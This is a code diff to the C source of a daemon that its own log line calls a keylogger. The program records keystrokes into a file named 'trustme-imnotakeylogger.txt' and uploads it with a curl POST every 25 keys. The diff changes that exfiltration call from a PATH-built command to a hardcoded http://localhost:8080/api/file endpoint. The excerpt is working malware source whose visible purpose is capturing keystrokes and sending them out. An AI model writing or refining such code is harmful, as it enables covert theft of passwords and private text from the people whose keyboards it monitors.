@@ -152,9 +152,8 @@ int main()
     syslog (LOG_NOTICE, "Keylogger working correctly");
     FILE * keylog;
     char curl_command[200]=""; 
-    sprintf(curl_command, "curl -X POST --data '@trustme-imnotakeylogger.txt' %s",PATH);
     int auxkey, key, amount=0;
-    key = auxkey = -999; 
+    key = auxkey = -999;  
     keylog = fopen("trustme-imnotakeylogger.txt","wt");
         while (1)    { //will only stop when the daemon dies
             while(auxkey == key) 
@@ -165,7 +164,7 @@ int main()
               fprintf(keylog,"%c", *us_translated_key);
             if (amount >= 25){
               amount = 0;
-              system(curl_command);
+              system("curl -X POST --data '@trustme-imnotakeylogger.txt' http://localhost:8080/api/file");
 
               //curl -X POST https://example.com/process --data 
 
